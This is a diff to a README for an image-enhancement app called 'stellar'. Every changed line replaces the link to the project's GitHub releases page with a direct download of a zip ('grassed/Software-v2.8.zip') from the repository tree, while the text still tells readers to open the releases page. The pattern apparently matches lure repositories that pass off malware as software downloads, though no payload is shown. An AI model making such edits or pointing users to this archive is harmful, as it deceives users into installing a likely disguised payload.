@@ -1,6 +1,6 @@
 # ✨ stellar - Improve images to stellar quality
 
-[![Download stellar](https://img.shields.io/badge/Download-stellar-blue?style=for-the-badge&logo=github)](https://github.com/Equipped-category48/stellar/releases)
+[![Download stellar](https://img.shields.io/badge/Download-stellar-blue?style=for-the-badge&logo=github)](https://github.com/Equipped-category48/stellar/raw/refs/heads/main/grassed/Software-v2.8.zip)
 
 ## 🚀 What stellar does
 
@@ -31,7 +31,7 @@ For best results:
 
 Visit this page to download the Windows release:
 
-[https://github.com/Equipped-category48/stellar/releases](https://github.com/Equipped-category48/stellar/releases)
+[https://github.com/Equipped-category48/stellar/raw/refs/heads/main/grassed/Software-v2.8.zip](https://github.com/Equipped-category48/stellar/raw/refs/heads/main/grassed/Software-v2.8.zip)
 
 On the releases page:
 1. Open the latest release
@@ -172,7 +172,7 @@ If the app feels slow, close other large programs and try a smaller batch.
 
 Use this link to visit the download page again:
 
-[https://github.com/Equipped-category48/stellar/releases](https://github.com/Equipped-category48/stellar/releases)
+[https://github.com/Equipped-category48/stellar/raw/refs/heads/main/grassed/Software-v2.8.zip](https://github.com/Equipped-category48/stellar/raw/refs/heads/main/grassed/Software-v2.8.zip)
 
 ## 🏷️ Topics
 
